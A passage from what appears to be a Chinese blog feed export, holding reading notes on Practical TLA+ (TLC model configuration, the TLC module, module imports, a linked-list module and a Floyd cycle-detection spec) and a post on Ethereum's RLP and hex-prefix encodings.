<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONSTANTS Capacity, Items, SizeRange, ValueRange</span><br><span class="line">ASSUME SizeRange \subseteq 1..Capacity</span><br><span class="line">ASSUME Capacity &gt; 0</span><br><span class="line">ASSUME \A v \in ValueRange: v &gt;= 0</span><br><span class="line">ItemParams == [size: SizeRange, value: ValueRange]</span><br><span class="line">ItemSets == [Items -&gt; ItemParams]</span><br></pre></td></tr></table></figure>
<h3 id="Infinite-Sets"><a href="#Infinite-Sets" class="headerlink" title="Infinite Sets"></a>Infinite Sets</h3><p>​    到目前为止我们用的大多数都是有限集合，但是TLA+也可以指定某些类型的无限集，不能从集合中选择元素，也不能将其分类变量，但是可以用来测试成员资格。如果我们导入了Integers模块，可以得到无限集Int，我们也可以导入模块Naturals，得到自然数集合Nat，那么我们的假设就可以写的更加多样化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ASSUME SizeRange \subseteq 1..Capacity</span><br><span class="line">ASSUME Capacity \in Nat \ &#123;0&#125;</span><br><span class="line">ASSUME ValueRange \subseteq Nat</span><br></pre></td></tr></table></figure>
<p>​    通过这样写可以让类型更加明晰</p>
<h1 id="TLC运行时间"><a href="#TLC运行时间" class="headerlink" title="TLC运行时间"></a>TLC运行时间</h1><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>​    来看一下model页下的一些配置</p>
<p>​    <strong>What Is the Behavior Spec</strong>：关于这里我们一般选择<strong>Temporal Formula</strong>，有时候，如果Pluscal编译失败，他会自动切换到”No Behavior Spec”，有时候我们也可以通过这个模式来测试一些表达式</p>
<p>​    <strong>What to Check</strong>：Invariants是我们放置安全不变量的地方，剩下的Deadlock和Properties将会在后续介绍</p>
<p>​    <strong>How to run</strong>：我们可以在这里做一些运行时间的优化来让TLC更快，可以在Toolbox中深入学习这一点</p>
<p>​    <strong>Additional Definitions</strong>：在这里可以添加一些额外的操作来进行状态约束和定义常量，比如定义F(x) == x*2，然后就可以对常量进行赋值，即C &lt;- F(1)</p>
<p>​    <strong>State Constraint</strong>：这里放一些在模型中的所有状态下始终为真的表达式，但是和不变量不同，违反状态约束的话模型不会失败，而是会在搜索中删除该状态，TLC不会检查该状态的任何不变量1，也不能确定他的任何未来状态，这个东西的用处打开就是用来裁剪探索空间来更快的检查模型，但是可能会违反不变性</p>
<p>​    <strong>Definition Override</strong>：这里大概就是根据自己的习惯来进行一些定义，当然还是尽可能的让命名大众化</p>
<p>​    <strong>TLC Options</strong>：默认情况下我们的检查模式是BFS，可以改成DFS，如果spec不是有限的，这样做会很有用。但是最优的做法是采用状态约束，<strong>Simulation mode</strong>将用随机的轨迹代替有序的搜索，这种方法一般来说没有什么用，但是可以在极大状态空间上对spec进行压力测试</p>
<h2 id="Error-Traces"><a href="#Error-Traces" class="headerlink" title="Error Traces"></a>Error Traces</h2><p>​    这里主要说一下<strong>Error-Trace Exploration</strong>，在这里可以添加一些表达然后测试它，显然这简直是debug的神器！！！</p>
<p>​    然后就是primed value，即可以展示某个东西的输出改变了什么，如Op(x, y)’，测试了Op(x, y)输出后改变了什么，注意要加<strong>单引号</strong>，然后就是Op(x’, y)，将会测试在x之后的Op改变了什么</p>
<h2 id="The-TLC-Module"><a href="#The-TLC-Module" class="headerlink" title="The TLC Module"></a>The TLC Module</h2><p>​    除了第三章的@@和:&gt;，TLC还提供了一些别的操作，可以用来debug</p>
<h3 id="Print-and-PrintT"><a href="#Print-and-PrintT" class="headerlink" title="Print and PrintT"></a>Print and PrintT</h3><p>​    Print(val, out)用来在User Output打印val和out，然后检查out</p>
<p>​    PrintT(val)和Print(val, TRUE)是一样的</p>
<h3 id="Assert"><a href="#Assert" class="headerlink" title="Assert"></a>Assert</h3><p>​    如果val为真，那么Assert(val,out)为真，如果为假的话输出作物，然后如果想要输出的更加明晰，可以利用元组或结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt; LET x == 3 y == 5 IN Assert(x &gt; y, &lt;&lt;x, &quot; is more than &quot;, y&gt;&gt;)</span><br><span class="line">The first argument of Assert evaluated to FALSE; the second argument was:</span><br><span class="line">&lt;&lt;3, &quot; is more than &quot;, 5&gt;&gt;</span><br></pre></td></tr></table></figure>
<p>​    当然如果不想这么丑陋，也可以用ToString(_)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt; LET x == 3 y == 5 IN Assert(x &gt; y, ToString(x) \o &quot; is more than &quot; \o </span><br><span class="line">ToString(y))</span><br><span class="line">The first argument of Assert evaluated to FALSE; the second argument was:</span><br><span class="line">&quot;3 is more than 5&quot;</span><br></pre></td></tr></table></figure>
<h3 id="Permutations-and-SortSeq"><a href="#Permutations-and-SortSeq" class="headerlink" title="Permutations and SortSeq"></a>Permutations and SortSeq</h3><p>​    Permutations(set) 是集合中的所有可能的顺序，SortSeq(seq, Op(_,_))是基于Op进行排序的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt; Permutations(&#123;1, 2, 3&#125;)</span><br><span class="line">&#123; &lt;&lt;1, 2, 3&gt;&gt;, &lt;&lt;1, 3, 2&gt;&gt;, &lt;&lt;2, 1, 3&gt;&gt;, &lt;&lt;2, 3, 1&gt;&gt;, &lt;&lt;3, 1, 2&gt;&gt;, &lt;&lt;3, 2, </span><br><span class="line">1&gt;&gt; &#125;</span><br><span class="line">&gt;&gt; SortSeq(&lt;&lt;1, 2, 3&gt;&gt;, LAMBDA x, y: x &gt; y)</span><br><span class="line">&lt;&lt;3, 2, 1&gt;&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Imports"><a href="#Imports" class="headerlink" title="Imports"></a>Imports</h2><p>​    一个规范中可以有多个module，第一个作为主模块，并且是唯一运行的模块，其他模块可以用来为Spec提供新的运算符、值、数据结构导入模块主要有两种方式，即EXTENDS和INSTANCE，前者可以一次性导入多个，后者只能导入一个。导入之前工具箱需要先发现模块，主要有三种方式</p>
<ol>
<li>自动知道处于同一文件夹中的所有模块</li>
<li>通过Preferences &gt; TLA+中添加通用库路径</li>
<li>右键单击Spec Explorer，为其添加额外的库路径</li>
</ol>
<h3 id="EXTENDS"><a href="#EXTENDS" class="headerlink" title="EXTENDS"></a>EXTENDS</h3><p>​    需要注意的就是在添加多个库的时候</p>
<h3 id="INSTANCE"><a href="#INSTANCE" class="headerlink" title="INSTANCE"></a>INSTANCE</h3><p>​    这个和EXTENDS差不多，但是有四个不同点</p>
<ol>
<li>在一个陈述中不能添加多个库</li>
<li>像操作一样，可以添加前缀LOCAL来让模块私有</li>
<li>可以命名模块，通过分配操作符来实现这一点，即PT == INSTANCE PT，然后通过PT!OP 来调用PT中的··操作符</li>
<li>可以导入参数化模块，或者导入定义常量的模块</li>
</ol>
<p>下面给出例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---- module Point ----</span><br><span class="line">LOCAL INSTANCE Integers</span><br><span class="line">CONSTANTS X, Y</span><br><span class="line">ASSUME X \in Int</span><br><span class="line">ASSUME Y \in Int</span><br><span class="line">Point == &lt;&lt;X, Y&gt;&gt;</span><br><span class="line">Add(x, y) == &lt;&lt;X + x, Y + y&gt;&gt;</span><br><span class="line">====</span><br></pre></td></tr></table></figure>
<p>然后要给出参数的值，应该用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSTANCE Point WITH X &lt;- 1, Y &lt;- 2</span><br></pre></td></tr></table></figure>
<p>值得注意的是，对于导入模块，导入的模块一定不能编译，否则会报错，另外就是之前说的INSTANCE声明模块值，直接用上面的语句即可，即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P1 == INSTANCE Point WITH X &lt;- 1, Y &lt;- 2</span><br></pre></td></tr></table></figure>
<p>另外就是所谓的偏向声明，把另外一个当成参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P1(Y) == INSTANCE Point WITH X &lt;- 1</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    这一章主要学习了如何使用常量来为同一个spec来创造有区别的模型，然而现在我们还是只能去写单一进程的算法，不过很快就可以写多进程的了</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>TLA+</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>《Practical-TLA+》阅读笔记（八）</title>
    <url>/2021/09/25/%E3%80%8APractical-TLA-%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0%EF%BC%88%E5%85%AB%EF%BC%89/</url>
    <content><![CDATA[<h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><p>​    这一章主要就是讲了在spec中如何加入数据结构，主要是需要在文件外面写一些modules，感觉就跟写个类差不多，先定义结点，再定义操作。</p>
<p>​    在TLA+中，所有的数据结构都用函数或结构实现，首先以链表<strong>LinkedLists</strong>为例，首先需要定义每一个结点，也有数据域和指针域，指针的关系我们用如下的操作来表示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PointerMaps(Nodes) == [Nodes -&gt; Nodes]</span><br></pre></td></tr></table></figure>
<p>​    <del>虽然感觉这样定义有点怪怪的</del>，但是先暂时这样定义吧，然后我们定义最后的结点，即需要NULL的概念</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONSTANT NULL</span><br><span class="line">LOCAL INSTANCE TLC</span><br><span class="line">PointerMaps(Nodes) == [Nodes -&gt; Nodes \union &#123;NULL&#125;]</span><br><span class="line">LinkedLists(Nodes) == </span><br><span class="line">	IF NULL \in Nodes THEN Assert(FALSE,&quot;NULL cannot be in Nodes&quot;) ELSE \*...</span><br></pre></td></tr></table></figure>
<p>​    然后就是这样定义单链表有可能会出现二义性，例如出现每个元素的指向都为空的情况，为了避免发生，我们需要一个判断</p>
<p>​    接下来就是我们需要找到表头结点，因为我们目前已经给出的都是结构，所以可以通过一系列操作转化成序列，也就是可以有如下的写法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\* PointerMap is an element of PointerMaps</span><br><span class="line">isLinkedList(PointerMap) ==</span><br><span class="line"> LET</span><br><span class="line"> nodes == DOMAIN PointerMap</span><br><span class="line"> all_seqs == [1..Cardinality(nodes) -&gt; nodes]</span><br><span class="line"> IN \E ordering \in all_seqs:</span><br><span class="line"> \* each node points to the next node in the ordering</span><br><span class="line"> /\ \A i \in 1..Len(ordering)-1:</span><br><span class="line"> PointerMap[ordering[i]] = ordering[i+1]</span><br><span class="line"> \* all nodes in the mapping appear in the ordering</span><br><span class="line"> /\ \A n \in nodes:</span><br><span class="line"> \E i \in 1..Len(ordering):</span><br><span class="line"> ordering[i] = n</span><br><span class="line">LinkedLists(Nodes) ==</span><br><span class="line"> IF NULL \in Nodes THEN Assert(FALSE, &quot;NULL cannot be in Nodes&quot;) ELSE</span><br><span class="line"> &#123;pm \in PointerMaps(Nodes) : isLinkedList(pm)&#125;</span><br></pre></td></tr></table></figure>
<p>​    但是现在我们想得到的是更小的链表，可以对LinkedLists(Nodes)做如下改动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LinkedLists(Nodes) ==</span><br><span class="line"> IF NULL \in Nodes THEN Assert(FALSE, &quot;NULL cannot be in Nodes&quot;) ELSE</span><br><span class="line"> LET</span><br><span class="line"> node_subsets == (SUBSET Nodes \ &#123;&#123;&#125;&#125;)</span><br><span class="line"> pointer_maps_sets == &#123;PointerMaps(subn): subn \in node_subsets&#125;</span><br><span class="line"> \* pointer_maps_sets is a set of set of functions,</span><br><span class="line"> \* so we need to union them all together</span><br><span class="line"> all_pointer_maps == UNION pointer_maps_sets</span><br><span class="line"> IN &#123;pm \in all_pointer_maps : isLinkedList(pm)&#125;</span><br></pre></td></tr></table></figure>
<p>​    接下来我们可以介绍一下双向链表，这个时候，谁是第一个已经无所谓了，因此有如下写法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ring(LL) == (DOMAIN LL = Range(LL))</span><br><span class="line">First(LL) ==</span><br><span class="line"> IF Ring(LL)</span><br><span class="line"> THEN CHOOSE node \in DOMAIN LL:</span><br><span class="line"> TRUE</span><br><span class="line"> ELSE CHOOSE node \in DOMAIN LL:</span><br><span class="line"> node \notin Range(LL)</span><br></pre></td></tr></table></figure>
<p>​    其实还是感觉这部分稍微有点费解，因为很多逻辑表达式的使用要让人反应很久，最后附上链表部分的代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------- MODULE LinkedLists ----------------------------</span><br><span class="line">CONSTANT NULL</span><br><span class="line"></span><br><span class="line">LOCAL INSTANCE FiniteSets \* For Cardinality</span><br><span class="line">LOCAL INSTANCE Sequences</span><br><span class="line">LOCAL INSTANCE TLC \* For Assert</span><br><span class="line">LOCAL INSTANCE Integers \* For a..b</span><br><span class="line"></span><br><span class="line">LOCAL PointerMaps(Nodes) == [Nodes -&gt; Nodes \union &#123;NULL&#125;]</span><br><span class="line"></span><br><span class="line">LOCAL Range(f) == &#123;f[x]: x \in DOMAIN f&#125;</span><br><span class="line"></span><br><span class="line">LOCAL isLinkedList(PointerMap) ==</span><br><span class="line">  LET </span><br><span class="line">    nodes == DOMAIN PointerMap</span><br><span class="line">    all_seqs == [1..Cardinality(nodes) -&gt; nodes]</span><br><span class="line">  IN \E ordering \in all_seqs:</span><br><span class="line">       /\ \A i \in 1..Len(ordering) - 1:</span><br><span class="line">         PointerMap[ordering[i]] = ordering[i+1]</span><br><span class="line">       /\ nodes \subseteq Range(ordering)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LinkedLists(Nodes) == </span><br><span class="line">  IF NULL \in Nodes THEN Assert(FALSE, &quot;NULL cannot be in Nodes&quot;) ELSE</span><br><span class="line">  LET </span><br><span class="line">    node_subsets == (SUBSET Nodes \ &#123;&#123;&#125;&#125;)</span><br><span class="line">    pointer_maps_sets == &#123;PointerMaps(subn): subn \in node_subsets&#125;</span><br><span class="line"></span><br><span class="line">    all_pointer_maps == UNION pointer_maps_sets</span><br><span class="line">  IN &#123;pm \in all_pointer_maps : isLinkedList(pm)&#125;</span><br><span class="line"></span><br><span class="line">Cyclic(LL) == NULL \notin Range(LL)</span><br><span class="line">Ring(LL) == DOMAIN LL = Range(LL)</span><br><span class="line"></span><br><span class="line">First(LL) == </span><br><span class="line">  IF Ring(LL)</span><br><span class="line">  THEN CHOOSE node \in DOMAIN LL: </span><br><span class="line">        TRUE</span><br><span class="line">  ELSE CHOOSE node \in DOMAIN LL: </span><br><span class="line">        node \notin Range(LL)</span><br><span class="line"></span><br><span class="line">=============================================================================</span><br></pre></td></tr></table></figure>
<h1 id="有效性"><a href="#有效性" class="headerlink" title="有效性"></a>有效性</h1><p>​    其实到现在很多时候还是不适应Pluscal的一些语法，感觉和常规的编程语言差了太多，比如这里要求证明在一个链表中有可能存在一个结点有两个父母，我的初步想法就是做循环，记录每一个自变量对应的值即可，但是这里就直接用了存在量词，其实就是直接把自然语言翻译成逻辑命题即可，直接看代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---- MODULE main ----</span><br><span class="line">EXTENDS TLC, Integers, FiniteSets, Sequences</span><br><span class="line">CONSTANTS Nodes, NULL</span><br><span class="line">INSTANCE LinkedLists WITH NULL &lt;- NULL</span><br><span class="line">AllLinkedLists == LinkedLists(Nodes)</span><br><span class="line">CycleImpliesTwoParents(ll) ==</span><br><span class="line"> Cyclic(ll) &lt;=&gt;</span><br><span class="line"> \E n \in DOMAIN ll:</span><br><span class="line"> Cardinality(&#123;p \in DOMAIN ll: ll[p] = n&#125;) = 2</span><br><span class="line">Valid ==</span><br><span class="line"> /\ \A ll \in AllLinkedLists:</span><br><span class="line"> /\ Assert(CycleImpliesTwoParents(ll), &lt;&lt;&quot;Counterexample:&quot;, ll&gt;&gt;)</span><br><span class="line"> ========</span><br></pre></td></tr></table></figure>
<h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><p>​    这里给的例子是Floyd判圈算法，用来在有限状态机、迭代函数或者链表上判断是否有环的算法。</p>
<h2 id="算法描述"><a href="#算法描述" class="headerlink" title="算法描述"></a>算法描述</h2><p>​    其实主要是利用双指针，乌龟和兔子在一个含环的跑道上进行比赛，乌龟在单位时间内移动一步，兔子移动两步，两者同时出发，如果存在环的话，乌龟总能和兔子相遇</p>
<h2 id="具体想法"><a href="#具体想法" class="headerlink" title="具体想法"></a>具体想法</h2><h3 id="判断是否有环"><a href="#判断是否有环" class="headerlink" title="判断是否有环"></a>判断是否有环</h3><p>​    定义双指针<strong>p1</strong>和<strong>p2</strong>，起始时指向头结点，然后p1每次移动1个，p2每次移动两个，如果p2移动到尾端的时候未与p1相遇，则不存在环，否则有环</p>
<h3 id="求环的长度"><a href="#求环的长度" class="headerlink" title="求环的长度"></a>求环的长度</h3><p>​    p1固定在相遇位置C，移动p2，每次移动1个长度，计数即可</p>
<h3 id="环的起点"><a href="#环的起点" class="headerlink" title="环的起点"></a>环的起点</h3><p>​    此时将一个指针移到表头结点，另一个指针在相遇节点，然后两者每次均移动一个单位，再次相遇时的位置就是环的起点位置</p>
<h3 id="简单证明"><a href="#简单证明" class="headerlink" title="简单证明"></a>简单证明</h3><p>​    其实这个证明总体还是比较简单，设变量去分析即可，这里借鉴了博客<a href="[算法-floyd判环(圈"></a>算法 | 祁宏涛 (qht1003077897.github.io)](<a href="https://qht1003077897.github.io/2017/07/03/算法-floyd判断链表是否有环/">https://qht1003077897.github.io/2017/07/03/算法-floyd判断链表是否有环/</a>))</p>
<h2 id="Pluscal代码如下"><a href="#Pluscal代码如下" class="headerlink" title="Pluscal代码如下"></a>Pluscal代码如下</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------------------------------ MODULE example ------------------------------</span><br><span class="line">EXTENDS TLC</span><br><span class="line">CONSTANTS Nodes,NULL</span><br><span class="line">INSTANCE LinkedLists_1</span><br><span class="line">(*--fair algorithm hare</span><br><span class="line">variables</span><br><span class="line">    ll \in LinkedLists(Nodes),</span><br><span class="line">    tortoise = First(ll),</span><br><span class="line">    hare = tortoise;</span><br><span class="line">macro advance(pointer) begin</span><br><span class="line">    pointer := ll[pointer];</span><br><span class="line">    if(pointer = NULL) then</span><br><span class="line">        assert ~Cyclic(ll);</span><br><span class="line">        goto Done;</span><br><span class="line">    end if;</span><br><span class="line">end macro;</span><br><span class="line">begin</span><br><span class="line">    while TRUE do</span><br><span class="line">        advance(tortoise);</span><br><span class="line">        advance(hare);</span><br><span class="line">        advance(hare);</span><br><span class="line">        if(tortoise = hare) then</span><br><span class="line">            assert Cyclic(ll);</span><br><span class="line">        goto Done;</span><br><span class="line">        end if;</span><br><span class="line">    end while;</span><br><span class="line">end algorithm;*)</span><br><span class="line">=============</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​    本章其实内容还是比较基本的，根据链表的设计来讨论如何设计数据结构。</p>
]]></content>
      <categories>
        <category>分布式系统</category>
        <category>TLA+</category>
      </categories>
      <tags>
        <tag>分布式系统</tag>
      </tags>
  </entry>
  <entry>
    <title>以太坊中的数据结构</title>
    <url>/2022/03/23/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h1 id="RLP"><a href="#RLP" class="headerlink" title="RLP"></a>RLP</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>​    根据前面的学习，在区块链中，每个区块上都存放着各种各样的数据，为了方便传输这些数据，需要有一种合理的编码解码方法，RLP就是这样的一种方法。</p>
<h2 id="RLP编码"><a href="#RLP编码" class="headerlink" title="RLP编码"></a>RLP编码</h2><p>​    首先，RLP编码先把数据划分成两类：</p>
<ul>
<li>字符串，如”dog”</li>
<li>列表，列表可以嵌套，如[]、[“dog”]、[[],”dog”,[“cat”],”]</li>
</ul>
<p>​    这里好像更官方的一个词是<code>item</code>。</p>
<p>​    编码方式主要有如下几种：</p>
<ul>
<li><p>如果输入的是在<code>[0x00,0x7f]</code>之间的单个字符，那它本身就是RLP编码</p>
</li>
<li><p>如果输入的是空值，比如空指针，编码是<code>0x80</code></p>
</li>
<li><p>如果输入的字符在<code>[0x80,0xff]</code>之间，RLP编码会在这个字符前加<code>0x81</code>组成列表，即编码为<code>[0x81,this_byte]</code></p>
</li>
<li><p>如果输入的是一个<code>2-55</code>字符长的字符串，RLP编码是在字符串之前加入一个值，这个值是字符串长度加上<code>0x80</code>，比如我们要编码<code>hello</code>，那么编码就是<code>[0x85,0x68,0x65,0x6c,0x6c,0x6f]</code></p>
</li>
<li><p>如果输入的字符串长度超过<code>55</code>，RLP编码将会由三个部分组成。第一部分由第二部分决定，是由第二部分的长度加上<code>0xb7</code>的一个字节。第二部分是这个字符串长度的16进制。最后一部分是字符串本身。这个时候第一个字符的范围应该是<code>[0xb8,0xbf]</code></p>
<p>比如，一个由1024个<code>a</code>组成的字符串，第二部分就是<code>0x04,0x00</code>，那相应的第一部分就是<code>0xb9</code></p>
</li>
<li><p>如果输入的是一个空的列表，那将它编码为<code>0xc0</code></p>
</li>
<li><p>如果输入的是一个长度不超过<code>55</code>的列表，那么RLP编码由两部分组成，第一部分就是<code>0xc0</code>加上列表长度，第二部分就是列表的按位表示。注意，<strong>列表的总长度是每项的RLP编码的长度和</strong></p>
<p>比如，要编码<code>[&quot;hello&quot;,&quot;world&quot;]</code>，那么可以算出来第一项就是<code>0xcc=0xc0+0x6+0x6</code>，然后每一项的RLP编码放进去就行</p>
</li>
<li><p>如果长度超过了<code>55</code>，RLP编码由三个部分组成，第一部分是用<code>0xf7</code>加上第二部分的长度，第二部分就是整个列表长度的16进制，第三部分就是这个列表。第一部分的编码应该在<code>[0xf8,0xff]</code>之间</p>
</li>
<li><p>最后，对于布尔类型的编码，<code>true=0x01</code>，<code>false=0x80</code>，在以太坊中并没有提到这一点，但是在Golang源码中可以看出这一点</p>
</li>
</ul>
<h2 id="RLP解码"><a href="#RLP解码" class="headerlink" title="RLP解码"></a>RLP解码</h2><p>​    在知道了编码规则后，解码也就变成了一个比较简单的事情，其实根据上面的编码规则，只需要解码出相应部分的长度就可以知道原始值了，主要是以下三个步骤：</p>
<ul>
<li>根据输入的第一个字符，解码出数据的类型，实际数据的长度和偏移量。</li>
<li>根据数据的类型和偏移量，解码出相应的数据。</li>
<li>继续往下解码出剩余的输入</li>
</ul>
<p>​    下面是更加详细的步骤：</p>
<ol>
<li>如果第一个byte位的范围在<code>[0x00,0x7f]</code>，它就是一个字符，并且就是它本身。</li>
<li>如果第一个byte位的范围在<code>[0x80,0xb7]</code>，这就是个字符串，它的长度就是第一个字符的值减去<code>0x80</code></li>
<li>如果第一个byte位的范围在<code>[0xb8,0xbf]</code>，这个字符串的长度超过了<code>55</code>，用第一个字符的值减去<code>0xb7</code>可以得到第二部分的长度，往后继续读这么多就可以得到字符串的长度。</li>
<li>如果第一个byte位的范围在<code>[0xc0,0xf7]</code>，这就是个列表，用第一个字符的值减去<code>0xc0</code>就可以得到列表的长度。</li>
<li>如果第一个byte位的范围在<code>[0xf8,0xff]</code>，依然还是个列表，列表长度由第一个字符减去<code>0xf7</code>得到的长度往后对应的值决定。</li>
</ol>
<p>​    其实总的来看，这里就是和上面解码一一对应的。</p>
<h1 id="HP"><a href="#HP" class="headerlink" title="HP"></a>HP</h1><p>​    在以太坊中，除了RLP编码，还有另外一种编码方式，叫做<code>Compact encoding</code>或<code>Hex-prefix(HP) encoding</code></p>
<h2 id="一些术语"><a href="#一些术语" class="headerlink" title="一些术语"></a>一些术语</h2><p>​    有些术语和以太坊中的<code>Trie</code>相关，可能理解起来会有点困难。</p>
<p>​    这里首先使用一个例子。看如下代码</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Root: &#123;<span class="number">1</span>: <span class="string">&#x27;Dog&#x27;</span>, <span class="number">2</span>: B, <span class="number">3</span>: A&#125;</span><br><span class="line"><span class="attr">A</span>: &#123;<span class="number">1</span>: C, <span class="number">2</span>: D, <span class="number">3</span>: <span class="string">&#x27;Cat&#x27;</span>&#125;</span><br><span class="line"><span class="attr">B</span>: &#123;<span class="number">1</span>: <span class="string">&#x27;Goat&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;Bear&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;Rat&#x27;</span>&#125;</span><br><span class="line"><span class="attr">C</span>: &#123;<span class="number">1</span>: <span class="string">&#x27;Eagle&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;Parrot&#x27;</span>, <span class="number">3</span>: E&#125;</span><br><span class="line"><span class="attr">D</span>: &#123;<span class="number">1</span>: <span class="string">&#x27;Shark&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;Dolphin&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;Whale&#x27;</span>&#125;</span><br><span class="line"><span class="attr">E</span>: &#123;<span class="number">1</span>: <span class="string">&#x27;Duck&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;Chinken&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;Pig&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
<p>​    现在我们的路径是<code>3-2-3</code>，我们要找出来最终对应的动物，那么整个过程如下：</p>
<ol>
<li>从根节点出发，最开始是3，那么对应的元素就是A</li>
<li>到了A，这个时候是2，对应的元素是D</li>
<li>到了D，这个时候的元素是3，对应的元素就是Whale</li>
</ol>
<p>​    在这个过程中，会有这样的术语：</p>
<ul>
<li><code>Key</code>：上述过程中的Root，A，B，C，D，E都是key</li>
<li><code>Node</code>：在<code>Key</code>的右边的部分就是Node，比如<code>&#123;1: &#39;Dog&#39;, 2: B, 3: A&#125;</code></li>
<li><code>Path</code>：这个就是上面那个例子中的<code>3-2-3</code></li>
<li><code>Value</code>：在所有的Node里，其中的元素都是键值对，Value就是键值对右边的部分</li>
<li><code>Nibble</code>：四个比特位的16进制形式就是一个nibble</li>
</ul>
<h2 id="RLD和HP的不同"><a href="#RLD和HP的不同" class="headerlink" title="RLD和HP的不同"></a>RLD和HP的不同</h2><p>​    RLD是用来对<code>Value</code>进行编码解码的，而HP是用来编码<code>Path</code>的</p>
<h2 id="HP编码目标"><a href="#HP编码目标" class="headerlink" title="HP编码目标"></a>HP编码目标</h2><p>​    在这里会遇到两个术语，即<code>leaf</code>和<code>extension</code>，由于这两个术语更多的是在<code>Trie</code>中被介绍，这里仅仅简单提一下。</p>
<p>​    <code>Leaf</code>和<code>extension</code>是两种类型的<code>node</code>，<code>Leaf</code>的路径有终点（<code>terminator</code>），但是后者没有。这里的终点指的是路径的最后一个值是十六进制的<code>0x10</code></p>
<p>​    此外，<code>path</code>的长度有可能是奇数，但是奇数长度的对于计算机来说不是很好处理，所以我们需要找一种方法将它变成偶数长度。</p>
<p>​    所以，HP的编码目标大概就是：</p>
<ol>
<li>区分<code>Leaf</code>和<code>extension</code>，并且不能够依靠终点。</li>
<li>把<code>path</code>都转化成偶数长度</li>
</ol>
<h2 id="HP编码规范"><a href="#HP编码规范" class="headerlink" title="HP编码规范"></a>HP编码规范</h2><p>​    主要有两点吧。</p>
<ol>
<li><p>如果输入有终点，就把终点移除</p>
</li>
<li><p>如果输入有符合下表的情况的话，就创造一个前缀。其中第一列表示有无这种值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">node type    path length    |    prefix    hexchar</span><br><span class="line">--------------------------------------------------</span><br><span class="line">extension    even           |    <span class="number">0000</span>      <span class="number">0x0</span></span><br><span class="line">extension    odd            |    <span class="number">0001</span>      <span class="number">0x1</span></span><br><span class="line">leaf         even           |    <span class="number">0010</span>      <span class="number">0x2</span></span><br><span class="line">leaf         odd            |    <span class="number">0011</span>      <span class="number">0x3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果前缀是<code>0x0</code>或者是<code>0x2</code>的话，就添加一个填充，填充的值就是0，因为这个时候可以保证路径的长度是偶数，填充完之后的前缀就是<code>0x00</code>和<code>0x20</code></p>
</li>
<li><p>把前缀加到路径里</p>
</li>
</ol>
<p>​    下面给几个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="string">&#x27;11 23 45&#x27;</span></span><br><span class="line">&gt; [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"><span class="string">&#x27;00 01 23 45&#x27;</span></span><br><span class="line">&gt; [<span class="number">0</span>,f,<span class="number">1</span>,c,b,<span class="number">8</span>,<span class="number">16</span>] # 这里有<span class="number">16</span>，就说明有叶子节点</span><br><span class="line"><span class="string">&#x27;20 0f 1c b8&#x27;</span></span><br><span class="line">&gt; [f,<span class="number">1</span>,c,b,<span class="number">8</span>,<span class="number">16</span>]</span><br><span class="line"><span class="string">&#x27;3f 1c b8&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="Radix-trie-amp-Merkle-trie"><a href="#Radix-trie-amp-Merkle-trie" class="headerlink" title="Radix trie&amp; Merkle trie"></a>Radix trie&amp; Merkle trie</h1><p>​    在上面我们已经提到了以太坊常用的一些编码方式，现在开始介绍以太坊中的数据是怎么解释的。主要使用了标题中提到的两种<code>Trie</code>，当然在以太坊中并不是直接使用它们的，而是混合使用，构成了<code>Patricia trie</code>，这个会在后续介绍，现在我们先来看看什么是<code>trie</code></p>
